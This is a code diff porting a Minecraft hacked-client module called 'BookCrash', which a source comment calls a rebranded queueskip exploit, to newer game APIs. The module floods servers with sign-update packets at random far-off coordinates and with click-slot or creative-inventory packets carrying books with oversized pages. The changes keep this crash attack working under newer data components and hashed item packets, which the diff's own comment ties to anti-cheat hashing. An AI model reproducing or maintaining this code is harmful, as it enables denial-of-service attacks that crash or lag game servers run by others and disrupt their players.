@@ -8,6 +8,8 @@
  */
 package org.bleachhack.module.mods;
 
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Random;
 import java.util.stream.Collectors;
 import java.util.stream.IntStream;
@@ -23,16 +25,18 @@ import org.bleachhack.setting.module.SettingToggle;
 
 import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
 import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
+import net.minecraft.component.DataComponentTypes;
+import net.minecraft.component.type.WritableBookContentComponent;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
-import net.minecraft.nbt.NbtCompound;
-import net.minecraft.nbt.NbtList;
-import net.minecraft.nbt.NbtString;
 import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
 import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
 import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
 import net.minecraft.network.packet.s2c.common.DisconnectS2CPacket;
 import net.minecraft.screen.slot.SlotActionType;
+import net.minecraft.screen.sync.ComponentChangesHash;
+import net.minecraft.screen.sync.ItemStackHash;
+import net.minecraft.text.RawFilteredPair;
 import net.minecraft.util.math.BlockPos;
 
 /* Rebranded queueskip exploit. credit > https://www.youtube.com/watch?v=-BA4ABlFJuc */
@@ -57,10 +61,6 @@ public class BookCrash extends Module {
 			return;
 
 		ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
-		NbtList list = new NbtList();
-		NbtCompound tag = new NbtCompound();
-		String author = "Bleach";
-		String title = "\n Bleachhack Owns All \n";
 
 		String size = "";
 		int pages = Math.min(getSetting(4).asSlider().getValueInt(), 100);
@@ -82,28 +82,33 @@ public class BookCrash extends Module {
 			String text = "bh ontop";
 			Random rand = new Random();
 			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
+				// ported: UpdateSignC2SPacket gained a "front" side flag since signs can now have
+				// text on both sides; true keeps the previous (only) sign side behaviour.
 				mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
-						new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), text, text, text, text));
+						new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), true, text, text, text, text));
 			}
 		} else {
+			// ported: 1.19.4 wrote pages as a raw nbt string list ("author"/"title" were also written
+			// to the tag even though WRITABLE_BOOK never reads them); 1.21.11 stores pages as a
+			// WritableBookContentComponent, which is all a writable book ever actually used.
+			List<RawFilteredPair<String>> list = new ArrayList<>();
 			for (int i = 0; i < pages; i++) {
-				NbtString tString = NbtString.of(size);
-				list.add(tString);
+				list.add(RawFilteredPair.of(size));
 			}
 
-			tag.putString("author", author);
-			tag.putString("title", title);
-			tag.put("pages", list);
-
-			bookObj.setSubNbt("pages", list);
-			bookObj.setNbt(tag);
+			bookObj.set(DataComponentTypes.WRITABLE_BOOK_CONTENT, new WritableBookContentComponent(list));
 
 			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
 				if (getSetting(0).asMode().getMode() == 0) {
-					Int2ObjectMap<ItemStack> map = new Int2ObjectOpenHashMap<>(1);
-					map.put(0, bookObj);
+					// ported: ClickSlotC2SPacket no longer carries raw ItemStacks, only server-verifiable
+					// ItemStackHash values (anti-cheat hashing added after 1.19.4); build them the same
+					// way ClientPlayerInteractionManager.clickSlot does.
+					ComponentChangesHash.ComponentHasher hasher = mc.player.networkHandler.getComponentHasher();
+					ItemStackHash bookHash = ItemStackHash.fromItemStack(bookObj, hasher);
+					Int2ObjectMap<ItemStackHash> map = new Int2ObjectOpenHashMap<>(1);
+					map.put(0, bookHash);
 
-					mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, 0, SlotActionType.PICKUP, bookObj, map));
+					mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, (short) 0, (byte) 0, SlotActionType.PICKUP, map, bookHash));
 				} else {
 					mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
 				}
